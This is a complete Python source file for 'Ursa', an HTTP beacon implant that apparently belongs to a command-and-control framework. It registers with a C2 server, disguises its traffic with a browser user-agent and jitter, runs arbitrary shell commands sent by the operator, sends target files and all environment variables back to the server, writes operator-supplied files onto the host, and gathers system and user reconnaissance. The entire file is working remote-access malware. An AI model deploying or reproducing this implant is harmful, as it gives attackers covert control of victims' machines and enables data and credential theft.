#!/usr/bin/env python3
"""
Ursa — HTTP Beacon Implant
============================
Runs on the target. Beacons back to the Ursa Major C2 server on a
configurable interval with jitter. Picks up tasks, executes them,
and returns results.

Task Types:
    shell       — Execute a shell command
    download    — Download a file from the target
    upload      — Upload a file to the target
    sleep       — Change beacon interval
    kill        — Self-terminate
    sysinfo     — Gather system information
    ps          — List running processes
    pwd         — Print working directory
    cd          — Change directory
    ls          — List directory contents
    whoami      — Current user info
    env         — Environment variables
    screenshot  — Take a screenshot (if supported)

Usage:
    python3 beacon.py --server http://C2_IP:8443 [--interval 5] [--jitter 0.1]
"""

import sys
import os
import json
import time
import random
import base64
import socket
import platform
import subprocess
import urllib.request
import urllib.error
import argparse
import hashlib
import hmac
from datetime import datetime


class UrsaBeacon:
    """HTTP beacon implant for the Ursa C2 framework."""

    def __init__(self, server_url, interval=5, jitter=0.1):
        self.server = server_url.rstrip("/")
        self.interval = interval
        self.jitter = jitter
        self.session_id = None
        self.session_key = None
        self.crypto = None
        self.running = True
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    # ── Crypto (matches major/crypto.py UrsaCrypto) ──

    def _xor_bytes(self, a, b):
        return bytes(x ^ y for x, y in zip(a, b))

    def _encrypt(self, plaintext):
        """Encrypt with CTR mode + HMAC (matches UrsaCrypto.encrypt)."""
        if not self.session_key:
            return plaintext
        key_bytes = bytes.fromhex(self.session_key)
        enc_key = hashlib.sha256(key_bytes + b":enc").digest()
        mac_key = hashlib.sha256(key_bytes + b":mac").digest()

        iv = os.urandom(16)
        counter = int.from_bytes(iv, 'big')
        ciphertext = bytearray()

        if isinstance(plaintext, str):
            plaintext = plaintext.encode()

        for i in range(0, len(plaintext), 16):
            ctr_bytes = counter.to_bytes(16, 'big')
            keystream = hashlib.sha256(enc_key + ctr_bytes).digest()[:16]
            counter += 1
            chunk = plaintext[i:i+16]
            ciphertext.extend(self._xor_bytes(chunk, keystream[:len(chunk)]))

        message = iv + bytes(ciphertext)
        mac = hmac.new(mac_key, message, hashlib.sha256).digest()
        return base64.b64encode(message + mac).decode()

    def _decrypt(self, data):
        """Decrypt (matches UrsaCrypto.decrypt)."""
        if not self.session_key:
            return data
        raw = base64.b64decode(data)
        key_bytes = bytes.fromhex(self.session_key)
        enc_key = hashlib.sha256(key_bytes + b":enc").digest()
        mac_key = hashlib.sha256(key_bytes + b":mac").digest()

        mac_received = raw[-32:]
        message = raw[:-32]
        mac_expected = hmac.new(mac_key, message, hashlib.sha256).digest()
        if not hmac.compare_digest(mac_received, mac_expected):
            raise ValueError("HMAC verification failed")

        iv = message[:16]
        ciphertext = message[16:]
        counter = int.from_bytes(iv, 'big')
        plaintext = bytearray()

        for i in range(0, len(ciphertext), 16):
            ctr_bytes = counter.to_bytes(16, 'big')
            keystream = hashlib.sha256(enc_key + ctr_bytes).digest()[:16]
            counter += 1
            chunk = ciphertext[i:i+16]
            plaintext.extend(self._xor_bytes(chunk, keystream[:len(chunk)]))

        return bytes(plaintext)

    # ── HTTP Helpers ──

    def _post(self, path, data):
        """Send a POST request to the C2."""
        url = f"{self.server}{path}"
        body = json.dumps(data).encode()
        req = urllib.request.Request(url, data=body, method="POST")
        req.add_header("Content-Type", "application/json")
        req.add_header("User-Agent", self.user_agent)

        try:
            resp = urllib.request.urlopen(req, timeout=30)
            return json.loads(resp.read().decode())
        except urllib.error.HTTPError as e:
            return {"error": e.code}
        except Exception as e:
            return {"error": str(e)}

    def _get(self, path):
        """Send a GET request to the C2."""
        url = f"{self.server}{path}"
        req = urllib.request.Request(url)
        req.add_header("User-Agent", self.user_agent)

        try:
            resp = urllib.request.urlopen(req, timeout=30)
            return resp.read()
        except Exception:
            return None

    # ── System Info ──

    def _gather_sysinfo(self):
        """Collect system information for registration."""
        info = {
            "hostname": socket.gethostname(),
            "username": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
            "os": f"{platform.system()} {platform.release()}",
            "arch": platform.machine(),
            "pid": os.getpid(),
            "process": sys.executable,
            "interval": self.interval,
            "jitter": self.jitter,
        }
        return info

    # ── Registration ──

    def register(self):
        """Register with the C2 server."""
        sysinfo = self._gather_sysinfo()
        resp = self._post("/register", sysinfo)

        if "error" in resp:
            return False

        self.session_id = resp.get("session_id")
        self.session_key = resp.get("key")
        self.interval = resp.get("interval", self.interval)
        self.jitter = resp.get("jitter", self.jitter)

        return bool(self.session_id)

    # ── Beacon Loop ──

    def beacon(self):
        """Check in with the C2 and get pending tasks."""
        resp = self._post("/beacon", {
            "session_id": self.session_id,
        })

        if "error" in resp:
            return []

        return resp.get("tasks", [])

    def send_result(self, task_id, result="", error=""):
        """Send task results back to the C2."""
        self._post("/result", {
            "session_id": self.session_id,
            "task_id": task_id,
            "result": result,
            "error": error,
        })

    def upload_file(self, filename, data):
        """Upload a file to the C2 (exfiltration)."""
        self._post("/upload", {
            "session_id": self.session_id,
            "filename": filename,
            "data": base64.b64encode(data).decode(),
        })

    # ── Task Execution ──

    def execute_task(self, task):
        """Execute a task and return the result."""
        task_type = task.get("type", "")
        args = task.get("args", {})
        task_id = task.get("id")

        try:
            if task_type == "shell":
                result = self._exec_shell(args.get("command", ""))
            elif task_type == "sysinfo":
                result = self._exec_sysinfo()
            elif task_type == "download":
                result = self._exec_download(args.get("path", ""))
            elif task_type == "upload":
                result = self._exec_upload(args.get("path", ""),
                                           args.get("data", ""))
            elif task_type == "sleep":
                result = self._exec_sleep(args.get("interval"),
                                          args.get("jitter"))
            elif task_type == "kill":
                self.send_result(task_id, result="Implant terminated")
                self.running = False
                return
            elif task_type == "ps":
                result = self._exec_ps()
            elif task_type == "pwd":
                result = os.getcwd()
            elif task_type == "cd":
                result = self._exec_cd(args.get("path", ""))
            elif task_type == "ls":
                result = self._exec_ls(args.get("path", "."))
            elif task_type == "whoami":
                result = self._exec_whoami()
            elif task_type == "env":
                result = "\n".join(f"{k}={v}" for k, v in sorted(os.environ.items()))
            else:
                result = ""
                self.send_result(task_id, error=f"Unknown task type: {task_type}")
                return

            self.send_result(task_id, result=result)

        except Exception as e:
            self.send_result(task_id, error=str(e))

    def _exec_shell(self, command):
        """Execute a shell command."""
        try:
            result = subprocess.run(
                command, shell=True, capture_output=True, text=True, timeout=120
            )
            output = result.stdout
            if result.stderr:
                output += f"\n[stderr]\n{result.stderr}"
            if result.returncode != 0:
                output += f"\n[exit code: {result.returncode}]"
            return output.strip()
        except subprocess.TimeoutExpired:
            return "[ERROR] Command timed out (120s)"
        except Exception as e:
            return f"[ERROR] {e}"

    def _exec_sysinfo(self):
        """Gather detailed system information."""
        info = self._gather_sysinfo()
        # Add more detail
        try:
            info["cwd"] = os.getcwd()
            info["home"] = os.path.expanduser("~")
            info["python"] = sys.version
            info["path"] = os.environ.get("PATH", "")[:500]

            if platform.system() == "Darwin":
                ver = subprocess.run(["sw_vers"], capture_output=True, text=True, timeout=5)
                info["macos"] = ver.stdout.strip()
            elif platform.system() == "Linux":
                if os.path.exists("/etc/os-release"):
                    with open("/etc/os-release") as f:
                        info["distro"] = f.read().strip()[:300]
        except Exception:
            pass

        return json.dumps(info, indent=2)

    def _exec_download(self, path):
        """Download a file from the target to the C2."""
        path = os.path.expanduser(path)
        if not os.path.exists(path):
            return f"[ERROR] File not found: {path}"

        with open(path, "rb") as f:
            data = f.read()

        self.upload_file(os.path.basename(path), data)
        return f"Uploaded {path} ({len(data)} bytes) to C2"

    def _exec_upload(self, path, data_b64):
        """Upload a file from the C2 to the target."""
        path = os.path.expanduser(path)
        data = base64.b64decode(data_b64)
        with open(path, "wb") as f:
            f.write(data)
        return f"Written {len(data)} bytes to {path}"

    def _exec_sleep(self, interval=None, jitter=None):
        """Change beacon interval."""
        if interval is not None:
            self.interval = int(interval)
        if jitter is not None:
            self.jitter = float(jitter)
        return f"Sleep: {self.interval}s (jitter: {self.jitter})"

    def _exec_ps(self):
        """List running processes."""
        if platform.system() in ("Darwin", "Linux"):
            result = subprocess.run(
                ["ps", "aux"], capture_output=True, text=True, timeout=10
            )
            return result.stdout[:5000]
        else:
            result = subprocess.run(
                ["tasklist"], capture_output=True, text=True, timeout=10
            )
            return result.stdout[:5000]

    def _exec_cd(self, path):
        """Change working directory."""
        path = os.path.expanduser(path)
        os.chdir(path)
        return os.getcwd()

    def _exec_ls(self, path="."):
        """List directory contents."""
        path = os.path.expanduser(path)
        entries = []
        for entry in sorted(os.listdir(path)):
            full = os.path.join(path, entry)
            try:
                stat = os.stat(full)
                size = stat.st_size
                mtime = datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M")
                kind = "d" if os.path.isdir(full) else "f"
                entries.append(f"{kind}  {size:>10}  {mtime}  {entry}")
            except Exception:
                entries.append(f"?  {'?':>10}  {'?':>16}  {entry}")
        return "\n".join(entries) if entries else "(empty directory)"

    def _exec_whoami(self):
        """Get current user info."""
        lines = [
            f"User:     {os.getenv('USER') or os.getenv('USERNAME') or 'unknown'}",
            f"UID:      {os.getuid() if hasattr(os, 'getuid') else 'N/A'}",
            f"GID:      {os.getgid() if hasattr(os, 'getgid') else 'N/A'}",
            f"Home:     {os.path.expanduser('~')}",
            f"Shell:    {os.getenv('SHELL', 'N/A')}",
            f"Hostname: {socket.gethostname()}",
        ]
        # Check if root/admin
        if hasattr(os, 'getuid') and os.getuid() == 0:
            lines.append("Privilege: ROOT")
        return "\n".join(lines)

    # ── Main Loop ──

    def run(self):
        """Main beacon loop."""
        # Registration with retry
        max_retries = 10
        for attempt in range(max_retries):
            if self.register():
                break
            wait = min(2 ** attempt, 60)
            time.sleep(wait + random.uniform(0, wait * 0.3))
        else:
            return  # Failed to register

        # Beacon loop
        while self.running:
            try:
                tasks = self.beacon()
                for task in tasks:
                    self.execute_task(task)
            except Exception:
                pass

            # Sleep with jitter
            sleep_time = self.interval + random.uniform(
                -self.interval * self.jitter,
                self.interval * self.jitter
            )
            time.sleep(max(1, sleep_time))


def main():
    parser = argparse.ArgumentParser(description="Ursa Beacon Implant")
    parser.add_argument("--server", required=True, help="C2 server URL (e.g., http://10.0.0.1:8443)")
    parser.add_argument("--interval", type=int, default=5, help="Beacon interval in seconds")
    parser.add_argument("--jitter", type=float, default=0.1, help="Jitter factor (0.0-1.0)")
    args = parser.parse_args()

    beacon = UrsaBeacon(args.server, args.interval, args.jitter)
    beacon.run()


if __name__ == "__main__":
    main()
